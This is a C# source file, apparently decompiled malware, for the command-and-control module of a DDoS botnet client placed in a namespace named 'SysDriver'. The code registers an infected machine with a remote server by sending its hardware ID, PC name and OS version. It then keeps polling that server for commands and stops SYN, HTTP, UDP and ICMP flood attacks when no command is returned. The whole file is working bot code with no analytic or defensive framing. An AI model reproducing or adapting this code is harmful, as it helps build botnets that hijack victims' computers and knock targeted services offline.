using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace SysDriver;

internal class cControl : cCommandHandler
{
	private string sOldCommand = string.Empty;

	public void ConnectControl()
	{
		registerCCServer();
		Thread thread = new Thread(getCCServerCommand);
		thread.Start();
	}

	private void registerCCServer()
	{
		string parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&pcname=" + cMain.ConfigClass.sPCName + "&version=" + cMain.ConfigClass.sBotVersion + "&system=" + cMain.ConfigClass.sWinVersion;
		while (true)
		{
			try
			{
				string text = HTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (!(text == cMain.ConfigClass.sAuthCode))
					{
					}
					break;
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 1000);
		}
	}

	private void getCCServerCommand()
	{
		string parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
		while (true)
		{
			try
			{
				string text = HTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (text != sOldCommand)
					{
						handleCommand(text);
						sOldCommand = text;
					}
				}
				else
				{
					try
					{
						nSYNFlood.StopSYNFlood();
					}
					catch
					{
					}
					try
					{
						nHTTPFlood.StopHTTPFlood();
					}
					catch
					{
					}
					try
					{
						nUDPFlood.StopUDPFlood();
					}
					catch
					{
					}
					try
					{
						nICMPFlood.StopICMPFlood();
					}
					catch
					{
					}
					sOldCommand = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 1000);
		}
	}

	private string HTTPRequest(string URI, string Parameters)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URI);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
		byte[] bytes = Encoding.Default.GetBytes(Parameters);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}
}
